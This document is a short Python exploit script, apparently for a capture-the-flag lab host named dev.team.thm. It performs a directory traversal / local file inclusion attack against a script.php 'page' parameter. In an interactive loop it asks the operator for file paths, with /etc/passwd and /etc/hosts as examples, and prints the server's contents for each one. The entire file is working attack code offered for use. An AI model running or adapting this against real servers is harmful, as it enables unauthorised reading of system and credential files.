#!/usr/bin/python3

import sys
import requests

# Payload generator:
def payload(filename):
    return f'../../..{filename}'

# Exploit function
def exploit(filename): 
    response = requests.get(f'http://dev.team.thm/script.php?page={payload(filename)}', timeout=30)

    return response.text

if __name__ == "__main__":
    try:
        print('Enter the full path of the filename you want to retrieve (/etc/passwd, /etc/hosts, ...)')
        while True:
            filename = input('\t>> ')
            print(exploit(filename))

    except KeyboardInterrupt:
        print('... Quitting ...')
    except:
        print('Something went wrong :(')
        sys.exit()
